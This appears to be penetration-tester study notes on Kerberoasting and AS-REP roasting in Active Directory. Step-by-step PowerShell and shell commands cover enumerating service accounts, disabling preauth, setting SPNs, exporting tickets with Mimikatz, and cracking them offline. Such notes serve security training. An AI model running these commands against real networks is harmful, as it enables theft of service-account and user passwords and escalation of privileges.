# Kerberoast

* offline cracking of service account passwords
* the kerberos session ticket (TSG) has a server portion which is encrypted with the password hash of service account. this makes it possible to request a ticket and do offline password attack
* service accounts are usually ignored (passwords rarely changed) and have privileged access.
* password hashes of service accounts could be used to create silver tickets.
* this attack involves steps 3 & 4 of the kerberos workflow discussed earlier.

<br>

## classic kerberoast attack

#### finding user accounts used as service accounts
```powershell
Get-NetUser -SPN   ## powerview

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   ## AD module
```

#### request a TGS
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/servername.sub.domain.local"
```

* Request-SPNTicket from powerview can be used for cracking with john or hashcat

#### check if TGS has been granted
```powershell
klist
```

#### export all tickets using mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### crack the service account password
```powershell
python.exe .\tgsrepcrack.py .\pass-list.txt '.\2-xxxxxxxx-user1@MSSQLSvc~servername.sub.domain.local-SUB.DOMAIN.LOCAL.kirbi'
```

https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py


<br>

## targeted kerberoasting - AS-REPs

* rare - kerberos authentication is enabled by default, so rare to find this setting changed.
* if a users UserAccountControl settings have "do not require kerberos preauthentication" enabled, example, kerberos preauth disabled, it is possible to grab users crackable AS-REP and bruteforce it offline
* with sufficient rights (genericwrite or genericall), kerberos preauth can be forced disabled.
* this attack involves steps 1 & 2 of the kerberos workflow discussed earlier


#### enumerating accounts with kerberos preauth disabled
```powershell
Get-DomainUser -PreauthNotRequired -Verbose   ## powerview-dev

Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth   ## AD module
```

### force disable kerberos preauth

#### enumerable the permissions for RDPUsers on ACLs using powerview
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity someuser1 -XOR @{useraccountcontrol=0000000} -Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```

### request encrypted AS-REP for offline bruteforce

#### use ASREPRoast
```powershell
Get-ASREPHash -Username someuser1 -Verbose
```

#### enumerate all users with kerneros preauth disabled and request hash
```powershell
Invoke-ASREPRoast -Verbose
```

https://github.com/HarmJ0y/ASREPRoast


### cracking the hashes

#### use bleeding-jumbo branch of JTR, we can bruteforce the hashes offline
```bash
./john someuser1 --wordlist=/opt/wordlist.txt
```


<br>

## targeted kerberoasting - Set SPN

* with enough rights (genericall/genericwrite), a target users SPN can be set to anything (unique in the domain)
* we can request a TGS without special privs. the TGS can be "kerberoasted"

#### enumerate permissions for RDPUsers on ACLs using powerview-dev
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

#### in powerview-dev see if the user already has a SPN
```powershell
Get-DomainUser -Identity someuser | select serviceprincipalname
```

#### using AD module
```powershell
Get-ADUser -Identity someuser -Properties ServicePrincipalName | select ServicePrincipalName
```

#### set SPN for user (must be unique for the domain)
```powershell
Set-DomainObject -Identity someuser -Set @{serviceprincipalname='ops/sigh1'}
```

#### using AD module
```powershell
Set-ADUser -Identity someuser -ServicePrincipalNames @{Add='ops/sigh1'}
```

#### request a ticket
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/sigh1"
```

* Request-SPNTicket from powerview can be used for cracking with john or hashcat

#### check if TGS has been granted
```powershell
klist
```

#### export all tickets using mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### crack the service account password
```powershell
python.exe .\tgsrepcrack.py .\pass-list.txt '.\2-xxxxxxxx-someuser@ops~sigh1.sub.domain.local-SUB.DOMAIN.LOCAL.kirbi'
```





 





































